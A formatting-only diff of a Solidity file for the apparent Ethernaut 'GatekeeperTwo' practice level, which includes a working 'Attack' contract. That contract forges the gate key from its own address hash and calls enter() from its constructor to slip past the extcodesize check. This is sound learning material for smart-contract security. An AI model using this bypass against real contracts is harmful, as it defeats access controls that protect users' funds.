@@ -10,7 +10,7 @@ contract GatekeeperTwo {
     }
 
     modifier gateTwo() {
-        uint x;
+        uint256 x;
         assembly {
             x := extcodesize(caller())
         }
@@ -20,17 +20,13 @@ contract GatekeeperTwo {
 
     modifier gateThree(bytes8 _gateKey) {
         require(
-            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^
-                uint64(_gateKey) ==
-                type(uint64).max,
+            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max,
             "INVALID GATEKEY"
         );
         _;
     }
 
-    function enter(
-        bytes8 _gateKey
-    ) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
         entrant = tx.origin;
         return true;
     }
@@ -38,17 +34,14 @@ contract GatekeeperTwo {
 
 contract Attack {
     constructor(address _gatekeeperTwo) {
-        bytes8 gateKey = bytes8(
-            uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^
-                type(uint64).max
-        );
+        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
 
         GatekeeperTwo instance = GatekeeperTwo(_gatekeeperTwo);
         instance.enter(gateKey);
     }
 
     modifier isContract() {
-        uint x;
+        uint256 x;
         assembly {
             x := extcodesize(caller())
         }
